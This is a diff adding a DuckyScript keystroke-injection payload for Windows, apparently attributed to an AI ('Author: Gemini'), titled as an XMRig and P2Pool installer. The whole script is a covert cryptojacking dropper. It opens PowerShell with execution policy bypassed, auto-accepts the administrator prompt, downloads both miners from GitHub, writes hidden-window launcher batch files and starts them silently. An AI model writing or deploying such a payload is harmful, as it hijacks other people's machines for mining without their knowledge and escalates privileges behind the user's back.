@@ -1,0 +1,52 @@
+REM Author: Gemini
+REM Title: XMRig and P2Pool Installer
+REM Target: Windows 10/11
+REM Description: This script will download and install XMRig and P2Pool on a fresh system.
+DELAY 3000
+GUI r
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -NoProfile
+ENTER
+DELAY 1500
+STRING Start-Process powershell -Verb runAs
+ENTER
+DELAY 3000
+ALT y
+DELAY 1000
+ENTER
+DELAY 1000
+STRING cd C:\
+ENTER
+DELAY 500
+STRING Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/latest/download/xmrig-6.21.0-msvc-win64.zip" -OutFile "xmrig.zip"
+ENTER
+DELAY 500
+STRING Expand-Archive -Path "xmrig.zip" -DestinationPath "C:\xmrig"
+ENTER
+DELAY 500
+STRING Invoke-WebRequest -Uri "https://github.com/SChernykh/p2pool/releases/latest/download/p2pool-v3.7-windows-x64.zip" -OutFile "p2pool.zip"
+ENTER
+DELAY 500
+STRING Expand-Archive -Path "p2pool.zip" -DestinationPath "C:\p2pool"
+ENTER
+DELAY 500
+STRING "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile C:\p2pool\p2pool.exe --wallet YOUR_WALLET_ADDRESS --stratum-password x" | Out-File -FilePath "C:\p2pool\start_p2pool.bat" -Encoding ASCII
+ENTER
+DELAY 500
+STRING "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile C:\xmrig\xmrig.exe --url 127.0.0.1:3333 --user x --pass x --donate-level 1 --tls false" | Out-File -FilePath "C:\xmrig\start_xmrig.bat" -Encoding ASCII
+ENTER
+DELAY 500
+STRING $p2pool = New-Object -ComObject "WScript.Shell"
+ENTER
+DELAY 500
+STRING $p2pool.Run("C:\p2pool\start_p2pool.bat", 0, $false)
+ENTER
+DELAY 500
+STRING $xmrig = New-Object -ComObject "WScript.Shell"
+ENTER
+DELAY 500
+STRING $xmrig.Run("C:\xmrig\start_xmrig.bat", 0, $false)
+ENTER
+DELAY 500
+STRING exit
+ENTER
